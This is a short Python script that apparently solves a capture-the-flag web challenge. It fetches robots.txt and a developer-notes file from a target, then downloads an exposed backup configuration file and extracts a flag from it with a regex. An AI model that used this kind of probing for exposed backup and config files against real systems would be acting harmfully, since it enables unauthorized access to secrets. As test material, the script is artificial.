import requests
import re
import sys

def solve(target_url):
    base_url = target_url.rstrip('/')
    
    # 1. Fetch robots.txt
    print(f"[*] Checking {base_url}/robots.txt...")
    r_robots = requests.get(base_url + '/robots.txt')
    if r_robots.status_code == 200:
        print("[+] Found robots.txt:\n", r_robots.text)

    # 2. Fetch dev_notes.txt
    print(f"[*] Checking {base_url}/dev_notes.txt...")
    r_notes = requests.get(base_url + '/dev_notes.txt')
    if r_notes.status_code == 200:
        print("[+] Found dev_notes.txt:\n", r_notes.text)

    # 3. Fetch backup configuration file
    bak_url = base_url + '/backup_archives/sys_config.bak'
    print(f"[*] Fetching backup archive at {bak_url}...")
    r_bak = requests.get(bak_url)
    if r_bak.status_code == 200:
        match = re.search(r'FLAG\s*=\s*(flag\{[a-zA-Z0-9_]+\})', r_bak.text)
        if match:
            flag = match.group(1)
            print(f"[+] Found Flag: {flag}")
            return True

    print("[-] Flag not found during OSINT recon")
    return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8004"
    success = solve(target)
    sys.exit(0 if success else 1)
